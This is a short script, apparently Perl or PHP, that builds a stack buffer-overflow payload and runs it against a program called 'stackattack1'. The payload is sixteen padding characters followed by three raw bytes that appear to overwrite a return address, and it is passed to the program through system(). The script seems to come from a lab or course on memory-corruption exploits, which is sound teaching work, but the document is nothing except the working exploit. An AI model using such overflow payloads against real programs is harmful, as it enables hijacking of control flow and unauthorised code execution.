$arg = "ABCDEFGHIJKLMNOP"."\xbf\x11\x40";
$cmd = "stackattack1 ".$arg;

system($cmd);